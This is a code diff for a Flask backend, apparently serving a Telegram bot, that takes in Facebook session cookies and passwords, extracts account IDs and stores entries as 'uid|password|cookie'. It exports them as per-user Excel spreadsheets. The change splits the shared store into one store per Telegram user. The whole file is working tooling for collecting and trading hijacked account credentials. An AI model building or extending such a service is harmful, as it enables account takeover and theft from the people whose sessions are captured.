@@ -8,8 +8,8 @@ from io import BytesIO
 app = Flask(__name__)
 CORS(app)
 
-# Database sementara di RAM
-storage = []
+# Storage dipisah per user_id: { "12345": [data], "67890": [data] }
+user_storage = {}
 
 def extract_uid(cookie_string):
     match = re.search(r"c_user=(\d+)", cookie_string)
@@ -17,16 +17,21 @@ def extract_uid(cookie_string):
 
 @app.route('/')
 def home():
-    return "Backend Aktif!"
+    return "Backend Private Aktif!"
 
 @app.route('/save-cookie', methods=['POST'])
 def save_cookie():
     data = request.json
+    user_id = str(data.get('user_id', 'unknown')) # ID Telegram
     raw_cookie = data.get('cookie', '')
     password = data.get('password', 'tasik321')
 
     if not raw_cookie:
         return jsonify({"status": "error"}), 400
+
+    # Buat list baru jika user_id belum ada di storage
+    if user_id not in user_storage:
+        user_storage[user_id] = []
 
     uid = extract_uid(raw_cookie)
     formatted_string = f"{uid}|{password}|{raw_cookie}"
@@ -38,29 +43,32 @@ def save_cookie():
         "formatted": formatted_string
     }
     
-    storage.append(entry)
-    return jsonify({"status": "success", "data": entry})
+    user_storage[user_id].append(entry)
+    return jsonify({"status": "success", "total": len(user_storage[user_id])})
 
-@app.route('/get-all', methods=['GET'])
-def get_all():
-    return jsonify(storage)
+@app.route('/get-status', methods=['GET'])
+def get_status():
+    user_id = str(request.args.get('user_id', ''))
+    count = len(user_storage.get(user_id, []))
+    return jsonify({"total": count})
 
 @app.route('/download-excel', methods=['GET'])
 def download_excel():
-    if not storage:
-        return "Data masih kosong, silakan input dulu di bot!", 400
+    user_id = str(request.args.get('user_id', ''))
+    data = user_storage.get(user_id, [])
+
+    if not data:
+        return "Data kamu masih kosong!", 400
     
     output = BytesIO()
     workbook = xlsxwriter.Workbook(output)
     sheet = workbook.add_worksheet()
 
-    # Header
     headers = ["UID", "Password", "Formatted (Full)"]
     for col, header in enumerate(headers):
         sheet.write(0, col, header)
 
-    # Isi Data
-    for row, item in enumerate(storage, start=1):
+    for row, item in enumerate(data, start=1):
         sheet.write(row, 0, item['uid'])
         sheet.write(row, 1, item['password'])
         sheet.write(row, 2, item['formatted'])
@@ -72,10 +80,9 @@ def download_excel():
         output, 
         mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
         as_attachment=True, 
-        download_name='cookies_fb.xlsx'
+        download_name=f'cookies_fb_{user_id}.xlsx'
     )
 
 if __name__ == "__main__":
-    # Koyeb menggunakan port 8000 secara default
     port = int(os.environ.get("PORT", 8000))
     app.run(host='0.0.0.0', port=port)
